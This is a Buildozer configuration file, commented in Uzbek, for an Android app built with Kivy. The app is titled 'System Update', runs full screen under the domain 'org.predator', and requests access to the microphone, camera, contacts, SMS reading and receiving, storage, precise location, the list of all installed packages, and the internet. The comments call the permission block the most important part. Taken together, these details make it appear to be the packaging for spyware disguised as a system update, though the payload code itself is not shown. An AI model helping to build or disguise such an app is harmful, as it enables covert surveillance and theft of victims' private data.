[app]

# (str) Ilova nomi (Telefonda shu nom bilan ko'rinadi)
title = System Update

# (str) Paket nomi
package.name = sysupdate

# (str) Paket domeni (unikal bo'lishi kerak)
package.domain = org.predator

# (str) Asosiy kod joylashgan papka
source.dir = .

# (list) Ilovaga kiritiladigan fayl kengaytmalari
source.include_exts = py,png,jpg,kv,atlas

# (str) Ilova versiyasi
version = 1.0.0

# (list) Kerakli kutubxonalar (Requests va Kivy shart!)
requirements = python3,kivy==2.3.0,requests,urllib3,certifi,idna


# (str) Asosiy ekran holati (portrait, landscape yoki all)
orientation = portrait

# (bool) Ilova butun ekranni egallashi (full screen)
fullscreen = 1

# ==========================================================
# GENERAL RUXSATNOMALAR (ENG MUHIM QISM)
# ==========================================================
android.permissions = INTERNET, RECORD_AUDIO, CAMERA, READ_CONTACTS, READ_SMS, RECEIVE_SMS, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, ACCESS_FINE_LOCATION, QUERY_ALL_PACKAGES

# (int) Android API darajasi (33 - zamonaviy telefonlar uchun)
android.api = 31

# (int) Minimal Android API (21 - deyarli barcha telefonlar tushadi)
android.minapi = 21

# (int) Android SDK versiyasi
android.sdk = 33

# (str) Android NDK versiyasi
android.ndk = 25b

# (bool) SDK litsenziyasini avtomatik qabul qilish (Build to'xtab qolmasligi uchun)
android.accept_sdk_license = True

# (str) Ilova piktogrammasi (Ixtiyoriy)
# icon.filename = %(source.dir)s/icon.png

# (str) Ilova yuklanayotgan ekrandagi rasm (Splash screen)
# presplash.filename = %(source.dir)s/splash.png

# ==========================================================
# BUILD SOZLAMALARI
# ==========================================================
[buildozer]

# (int) Log darajasi (2 - batafsil xatoliklarni ko'rsatadi)
log_level = 2

# (str) Build qilinadigan vaqtinchalik papka
build_dir = ./.buildozer

# (str) Tayyor APK saqlanadigan papka
bin_dir = ./bin

# ==========================================================
# DIQQAT: GitHub Actions-da xato bermasligi uchun 
# yuqoridagi android.accept_sdk_license = True bo'lishi shart!
# ==========================================================
